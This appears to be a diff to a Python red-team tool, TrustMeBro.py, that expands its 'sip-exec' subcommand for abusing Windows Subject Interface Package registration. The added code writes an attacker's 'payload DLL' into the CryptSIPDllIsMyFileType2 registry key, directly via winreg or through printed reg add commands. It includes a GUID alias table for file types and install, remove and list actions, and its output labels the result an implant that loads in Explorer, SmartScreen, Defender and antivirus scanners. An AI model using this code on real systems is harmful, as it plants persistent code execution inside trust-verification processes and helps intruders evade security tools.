@@ -183,6 +183,36 @@ WIN11_SIPS = {
 ALL_SIPS = {**SIPS, **SAC_SIP, **WIN11_SIPS}
 SIP_NAMES = sorted(ALL_SIPS.keys())
 
+# GUID alias table for sip-exec (matches C++ resolve_guid)
+GUID_ALIASES = {
+    "pe":          ("{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys .ocx"),
+    "authenticode":("{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys .ocx"),
+    "java":        ("{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", ".class"),
+    "cab":         ("{C689AABA-8E78-11D0-8C47-00C04FC295EE}", ".cab"),
+    "msi":         ("{000C10F1-0000-0000-C000-000000000046}", ".msi .msp"),
+    "ps1":         ("{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1 .psd1"),
+    "powershell":  ("{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1 .psd1"),
+    "jscript":     ("{06C9E010-38CE-11D4-A2A3-00104BD35090}", ".js .jse"),
+    "vbscript":    ("{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", ".vbs .vbe"),
+    "wsf":         ("{1A610570-38CE-11D4-A2A3-00104BD35090}", ".wsf .wsc .sct"),
+    "appx":        ("{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", ".appx .msix"),
+    "appx-bundle": ("{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", ".appxbundle .msixbundle"),
+    "ctl":         ("{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", ".ctl .stl"),
+    "catalog":     ("{DE351A43-8E59-11D0-8C47-00C04FC295EE}", ".cat"),
+    "esd":         ("{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}", ".esd .wim"),
+    "sac":         ("{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}", "(Smart App Control, Win11)"),
+}
+
+def resolve_sip_alias(name):
+    """Resolve a GUID alias to (guid_string, extensions). Returns None if not found."""
+    entry = GUID_ALIASES.get(name.lower())
+    if entry:
+        return entry
+    # Treat as raw GUID
+    if name.startswith("{"):
+        return (name, "(custom)")
+    return None
+
 KEYS = []
 for name, guid in SIPS.items():
     KEYS.append(f"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")
@@ -819,11 +849,13 @@ def main():
     extract_parser.add_argument("--signer-index", type=int, default=-1, help="WIN_CERTIFICATE entry index to extract from (-1 = last, 0 = first)")
 
     # Subcommand: sip-exec
-    sipexec_parser = subparsers.add_parser("sip-exec", help="Register a DLL as CryptSIPDllIsMyFileType2 handler (code exec on WinVerifyTrust calls)")
-    sipexec_parser.add_argument("--dll", required=True, help="Full path to DLL on target (e.g. C:\\Temp\\payload.dll)")
+    sipexec_parser = subparsers.add_parser("sip-exec", help="Install, remove, or list payload DLLs on the SIP execution surface")
+    sipexec_parser.add_argument("action", nargs="?", default="install", choices=["install", "remove", "list"], help="Action (default: install)")
+    sipexec_parser.add_argument("--dll", help="Full path to payload DLL on target (required for install)")
     sipexec_parser.add_argument("--funcname", default="IsMyFileType2", help="Export function name (default: IsMyFileType2)")
-    sipexec_parser.add_argument("--guid", help="SIP GUID to register (default: random)")
-    sipexec_parser.add_argument("--clean", action="store_true", help="Remove the registered SIP GUID")
+    sipexec_parser.add_argument("--guid", help="SIP GUID or alias (pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac)")
+    sipexec_parser.add_argument("--clean", action="store_true", help="Remove (same as 'remove' action)")
+    sipexec_parser.add_argument("--local", action="store_true", help="Execute on local machine via winreg")
 
     args = parser.parse_args()
 
@@ -1012,33 +1044,112 @@ def main():
 
     elif args.command == "sip-exec":
         import uuid as _uuid
-        guid = args.guid or "{" + str(_uuid.uuid4()).upper() + "}"
-        if not guid.startswith("{"):
-            guid = "{" + guid + "}"
+        action = "remove" if getattr(args, 'clean', False) else getattr(args, 'action', 'install')
 
-        base = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2"
-        key = f"{base}\\{guid}"
+        base_key = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2"
 
-        if args.clean:
-            print(f"[*] Removing SIP exec registration: {guid}")
-            print(f"[*] Registry key: {key}")
-            print("[!] Manual removal required (use reg.exe delete or regedit).")
-            print(f'    reg delete "{key}" /f')
-        else:
-            print(f"[+] SIP Exec Registration")
-            print(f"    GUID:     {guid}")
-            print(f"    DLL:      {args.dll}")
-            print(f"    Function: {args.funcname}")
-            print(f"    Key:      {key}")
-            print()
-            print("[*] Registry commands to run on target (requires admin):")
-            print(f'    reg add "{key}" /v Dll /t REG_SZ /d "{args.dll}" /f')
-            print(f'    reg add "{key}" /v FuncName /t REG_SZ /d "{args.funcname}" /f')
-            print()
-            print("[!] Once registered, your DLL loads in ANY process that calls WinVerifyTrust.")
-            print("[!] This includes Explorer, SmartScreen, AV scanners, and certutil.")
-            print("[!] The DLL function is called during SIP file-type resolution for every file.")
-            print(f"[*] To remove: reg delete \"{key}\" /f")
+        if action == "list":
+            if getattr(args, 'local', False):
+                try:
+                    import winreg
+                    hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                        "SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2")
+                    i = 0
+                    print(f"{'GUID':<44} {'DLL':<40} {'Function'}")
+                    print(f"{'----':<44} {'---':<40} {'--------'}")
+                    while True:
+                        try:
+                            name = winreg.EnumKey(hkey, i)
+                            sub = winreg.OpenKey(hkey, name)
+                            dll = winreg.QueryValueEx(sub, "Dll")[0] if winreg.QueryValueEx(sub, "Dll") else ""
+                            func = winreg.QueryValueEx(sub, "FuncName")[0] if winreg.QueryValueEx(sub, "FuncName") else ""
+                            winreg.CloseKey(sub)
+                            print(f"{name:<44} {dll:<40} {func}")
+                            i += 1
+                        except OSError:
+                            break
+                    winreg.CloseKey(hkey)
+                except ImportError:
+                    print("[-] winreg not available. --local requires Windows.")
+                except OSError as e:
+                    print(f"[-] Failed to open SIP registry: {e}")
+            else:
+                print("[-] sip-exec list requires --local (runs on local machine).")
+                print("    On remote targets, use: reg query \"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\" /s")
+
+        elif action == "install":
+            if not args.dll:
+                print("[-] --dll is required for install.")
+                sys.exit(1)
+            guid_input = args.guid or str(_uuid.uuid4()).upper()
+            resolved = resolve_sip_alias(guid_input)
+            if resolved:
+                guid, extensions = resolved
+            else:
+                guid = "{" + guid_input + "}" if not guid_input.startswith("{") else guid_input
+                extensions = "(custom)"
+
+            key = f"{base_key}\\{guid}"
+
+            if getattr(args, 'local', False):
+                try:
+                    import winreg
+                    hkey = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
+                        f"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\{guid}",
+                        0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, args.dll)
+                    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, args.funcname)
+                    winreg.CloseKey(hkey)
+                    print(f"[+] Implant installed on SIP execution surface.")
+                except ImportError:
+                    print("[-] winreg not available. --local requires Windows.")
+                    sys.exit(1)
+                except OSError as e:
+                    print(f"[-] Registry write failed: {e}")
+                    sys.exit(1)
+            else:
+                print(f"[+] Implant registration commands:")
+
+            print(f"    GUID:       {guid}", end="")
+            if guid_input.lower() in GUID_ALIASES:
+                print(f" (alias: {guid_input})")
+            else:
+                print()
+            print(f"    Triggers:   {extensions}")
+            print(f"    Payload:    {args.dll}")
+            print(f"    Loads in:   Explorer, SmartScreen, Defender, certutil, signtool, AV")
+            if not getattr(args, 'local', False):
+                print()
+                print(f'    reg add "{key}" /v Dll /t REG_SZ /d "{args.dll}" /f')
+                print(f'    reg add "{key}" /v FuncName /t REG_SZ /d "{args.funcname}" /f')
+            print(f"Undo: TrustMeBro.py sip-exec remove --guid {guid_input}")
+
+        elif action == "remove":
+            if not args.guid:
+                print("[-] --guid is required for remove.")
+                sys.exit(1)
+            resolved = resolve_sip_alias(args.guid)
+            if resolved:
+                guid = resolved[0]
+            else:
+                guid = "{" + args.guid + "}" if not args.guid.startswith("{") else args.guid
+
+            key = f"{base_key}\\{guid}"
+
+            if getattr(args, 'local', False):
+                try:
+                    import winreg
+                    winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE,
+                        f"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\{guid}")
+                    print(f"[+] Implant removed: {guid}")
+                except ImportError:
+                    print("[-] winreg not available. --local requires Windows.")
+                except OSError as e:
+                    print(f"[-] Failed to remove: {e}")
+            else:
+                print(f"[*] Remove command:")
+                print(f'    reg delete "{key}" /f')
+                print(f"[+] GUID: {guid}")
 
     else:
         parser.print_help()
